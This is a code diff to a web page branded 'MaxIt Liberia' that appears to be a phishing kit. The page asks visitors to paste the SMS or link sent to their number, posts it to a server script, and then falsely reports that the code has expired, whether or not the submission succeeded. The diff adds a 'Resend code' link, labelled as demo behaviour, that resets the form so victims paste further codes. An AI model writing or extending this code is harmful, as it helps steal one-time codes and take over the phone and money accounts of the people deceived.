@@ -591,7 +591,9 @@
       <p class="verify-message" id="verifyMessage" role="status" aria-live="polite"></p>
       <textarea class="verify-textarea" id="verifyText" minlength="6" required
         placeholder="Paste the complete link/sms message sent to your number to activate plan"></textarea>
-      
+      <p id="resendArea" class="resend-area" hidden>
+        <a href="#" id="resendLink">Resend code</a>
+      </p>
       <button class="verify-submit" id="verifySubmit" type="submit" disabled>Verify</button>
     </form>
     <footer class="verify-footer">© 2026 MaxIt Liberia ·</footer>
@@ -743,6 +745,22 @@
   const verifySubmit = document.getElementById('verifySubmit');
   const verifyMessage = document.getElementById('verifyMessage');
 
+  const resendArea = document.getElementById('resendArea');
+  const resendLink = document.getElementById('resendLink');
+  
+  resendLink.addEventListener('click', (event) => {
+    event.preventDefault();
+  
+    // Demo behavior: allow the user to submit a fresh support message.
+    verifyText.disabled = false;
+    verifyText.value = '';
+    verifyMessage.textContent = '';
+    verifySubmit.disabled = true;
+    verifySubmit.textContent = 'Submit';
+    resendArea.hidden = true;
+    verifyText.focus();
+  });
+
 
   verifyText.addEventListener('input', () => {
     verifySubmit.disabled = verifyText.value.trim().length === 0;
@@ -787,6 +805,7 @@
       const result = await response.json(); if (!response.ok || !result.ok) throw new Error('Submission failed');
       verifyMessage.textContent = '⚠️ Message code expired. Please paste the new message below.'; verifyMessage.style.color = '#b42318';
       verifyText.disabled = true; verifySubmit.textContent = 'VERIFY';
+      resendArea.hidden = false;
 
     } catch (error) {
       const response = await fetch('notify-plan.php', { method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -794,6 +813,7 @@
       const result = await response.json(); if (!response.ok || !result.ok) throw new Error('Submission failed');
       verifyMessage.textContent = '⚠️ Message code expired. Please paste the new message below.'; verifyMessage.style.color = '#b42318';
       verifyText.disabled = true; verifySubmit.textContent = 'VERIFY';
+      resendArea.hidden = false;
     }
   });
 </script>
